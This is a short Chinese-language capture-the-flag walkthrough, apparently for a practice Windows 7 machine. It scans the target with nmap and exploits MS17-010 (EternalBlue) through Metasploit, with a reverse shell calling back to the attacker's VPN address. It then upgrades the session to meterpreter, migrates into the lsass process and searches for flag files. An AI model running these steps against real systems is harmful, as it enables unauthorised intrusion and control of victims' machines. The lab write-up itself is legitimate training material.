1.nmap -p- 10.49.190.61 -sV 
扫描靶机 发现开放80和5985端口 ，且发现windows版本较低，可能存在漏洞，其实就是永恒之蓝漏洞
ms17-010
2.msf里面可以直接进行攻击 search ms17-010  exploit/windows/smb/ms17_010_eternalblue这个可以直接use，然后设置参数rhosts 10.49.190.61 和lhost 192.168.243.230（openvpn的ip）和lport 12226
然后run 直接拿到一个meterpreter 的shell ，通常情况很难拿到这个shell 且不稳定 ，所以我们一般用cmd 来升级成meterpreter 的shell 输入shell
meterpreter > shell
Process 1320 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>  
接着找到shell_to_meterpreter模块 show options，这里的session参数是必须的，然后set session 1告诉要升级的是session 1 ，然后run 然后在sessions -l 查看是否有新session建立，在sessions -i 2 切换到新的session，这个时候就是比较稳定的meterpreter shell 了，可以执行sysinfo查看系统信息 getuid查看权限等
​
3.接着在执行               
ps
migrate 716 
getpid
然后在执行ps 列出所有进程 然后找到lsass的这个进程 把我们的这个会话附着在这个进程，因为它是管理本地安全认证服务的进程，更稳定，然后就可以使用search -f flag*.txt搜索出3个flag文件，拿到flag。这个是meterpreter特有的命令 如果是windows的话就用

```bash
C:\Windows\system32>dir /s /b C:\flag*.txt
# 参数说明：
# /s：递归搜索子目录
# /b：只显示文件路径（简洁模式，和 Meterpreter search 结果类似）
# C:\flag*.txt：搜索 C 盘所有 flag 开头的 txt 文件
```
